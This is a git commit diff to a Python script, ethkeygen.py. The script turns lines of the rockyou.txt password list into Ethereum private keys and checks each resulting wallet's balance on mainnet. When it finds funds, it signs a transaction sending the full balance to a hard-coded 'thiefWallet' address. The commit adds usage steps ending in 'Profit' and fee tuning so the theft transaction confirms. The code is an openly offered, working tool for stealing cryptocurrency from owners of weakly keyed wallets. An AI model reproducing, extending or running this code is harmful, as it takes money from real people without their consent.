57aac5c818e7985c4d61d1f17fb98c8bd8a02ae3
Mark R <13649452+mrudnitsky@users.noreply.github.com>
2022-06-30 01:19:09 -0400

    Crossing off some TODOs

--- ethkeygen.py
+++ ethkeygen.py
@@ -7,9 +7,20 @@
 #	Creates an Ethereum wallet from this entropy
 #	Saves the public and private keys of this wallet into a CSV file for future use
 # 	Checks the balance
-# 	In the infinitesimally small chance we found an active wallet, the keys are weak so let's steal the balance
+# 	If we find a wallet with Ether in it, the keys are weak so let's take the balance
+#
+# Benefits:
+# 	Dynamic fee generation (with changeable margin of safety) to ensure your transaction goes through
+#
+# How to use it:
+#	Install 'pip' and any packages this program needs, as listed in the import statements below
+#	Update the variables highlighted below
+#	Run with 'python ethkeygen.py'
+#	???
+#	Profit
 #
 # Project TODOs:
+#	Prompt user to change variable settings upon first running of the program
 #	Verbosity setting
 # 	Better error handling for web3 calls
 #	Check for any ERC tokens, not just Ether specifically
@@ -20,10 +31,10 @@
 #
 #############################################
 
-import csv, eth_utils
+import sys, csv, eth_utils
 from web3 import Web3
 from eth_account.account import Account
-from sys import getsizeof # Because apparently it will shit the bed otherwise; TODO: why can't we just 'import sys'?
+from sys import getsizeof # TODO: why can't we just 'import sys'?
 
 __author__ = "Mark Rudnitsky"
 __copyright__ = "(C)2022 Mark Rudnitsky"
@@ -33,17 +44,30 @@ __version__ = "1.0"
 __maintainer__ = "Mark Rudnitsky"
 __status__ = "Prototype"
 
+### CHANGE THESE ASAP ###
+keygenFile = "rockyou.txt" # For entropy
+dictFileName = "generated-keypairs.csv" # Database for generated keypairs
+thiefWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F" # Transfer any found funds here
+# Transaction fee details
+maxGasPerTx = 0 # Max gas we're willing to pay to make our transaction go through; 0 = set the gas price dyamically based on market conditions
+marginOfSafety = 20 # Percent above fee market rate we wnt to be at, high is more guarantee your tx will be included in the next block
+gasCost = 21000 # Keep constant unless you know what you're doing
+preferredPriorityFee = 4 # Current values: https://ethgasstation.info, https://etherscan.io/gastracker
+# API Details
 infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY" # ETH mainnet API access through Infura
-recipient = "YOUR_ETH_ADDRESS" # Transfer any found funds here
-keygenFile = "rockyou2.txt" # For entropy, change as needed
-dictFileName = "generated-keypairs.csv" # Database for generated keypairs, change as needed
-maxGasPerTx = 150 # Max gas we're willing to pay to make our transaction go through; TODO: dynamically adjust based on market conditions?
+connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey # Infura HTTPS API
+#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey # Infura Websockets API
+### END CHANGE THESE ASAP ###
 
-infuraUrl = "https://mainnet.infura.io/v3/" + infuraKey
-ganacheUrl = "http://127.0.0.1:7545" # Update if you change the Ganache defaults
-web3 = Web3(Web3.HTTPProvider(infuraUrl)) # Mainnet
-#web3 = Web3(Web3.HTTPProvider(ganacheUrl)) # Testnet
-#print("Connected: {}".format(web3.isConnected())) # Double check our connection works
+# Connect to the APIs so we can interact with the Ethereum blockchian
+if (connectionUrl.startswith('wss')): # Websockets
+	web3 = Web3(Web3.WebsocketProvider(connectionUrl))
+else: # HTTP(S)
+	web3 = Web3(Web3.HTTPProvider(connectionUrl))
+
+# Double check our connection works
+if not web3.isConnected():
+	sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")
 
 # Use the 'entropy' parameter to create an account
 def generateAddress(entropy):
@@ -67,7 +91,7 @@ def findANonZeroBalance(entropy):
 	# Create a wallet
 	pubKey, privKey = generateAddress(entropy)
 
-	nonce = web3.eth.getTransactionCount(pubKey)
+	nonce = web3.eth.getTransactionCount(pubKey, 'latest')
 	balance = web3.eth.getBalance(pubKey) # Balance in wei
 	#print(web3.fromWei(balance, "ether"))
 	
@@ -75,17 +99,24 @@ def findANonZeroBalance(entropy):
 	reporting(pubKey, privKey, balance)
 
 	# Jackpot
-	if (balance > 0): # 1 in 2^256 chance this condition is true
+	if (balance > 0): # 1 in 2^256 chance this condition is true		
+		# Calculate gas costs (london fork and EIP-1559 compliant)
+		baseFee = int(maxGasPerTx)
+		if not baseFee:
+			baseFee = web3.eth.getBlock("pending").baseFeePerGas
+		priorityFee = web3.toWei(preferredPriorityFee, 'gwei')
+		marginOfSafety = 1 + (marginOfSafety / 100)
+		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
+		
 		# Generate a send-to-us transaction
-		# TODO: Sanity check payload
-		# Max gas we're willing to pay to make our transaction go through
-		maxGasPerTx = 150 # Max gas we're willing to pay to make our transaction go through
 		tx = {
-		    'nonce': nonce,
-		    'to': recipient,
-		    'value': balance,
-		    'gas': 2000000,		  
-		    'gasPrice': web3.toWei(maxGasPerTx, 'gwei')
+			'from': pubKey,
+			'nonce': nonce,
+			'to': thiefWallet,
+			'value': balance,
+			'gas': gasCost,
+			'maxFeePerGas': maxFee,
+			'maxPriorityFeePerGas': priorityFee
 		}
 
 		signed_tx = web3.eth.account.signTransaction(tx, privKey)
@@ -100,7 +131,6 @@ def main():
 
 	for lineNum, textLine in enumerate(sourceFile):
 		# Get the line from the file and format it for our Ethereum tools
-		# TODO: More encodings besides UTF-8, necessary if we use non-English language wordlists
 		tempLine = str(textLine).strip()
 		tempLine = bytes(tempLine, 'utf-8')
 
